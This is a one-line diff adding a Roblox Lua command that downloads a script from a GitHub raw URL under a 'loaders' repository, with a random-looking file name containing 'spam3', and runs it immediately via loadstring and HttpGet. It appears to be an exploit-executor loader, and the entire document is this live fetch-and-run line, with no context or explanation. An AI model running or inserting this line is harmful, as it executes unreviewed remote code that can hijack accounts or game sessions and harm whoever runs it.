@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/anniversary-outcome-memories-v0-2-spam3-uoy7kqxho5098v.lua"))()
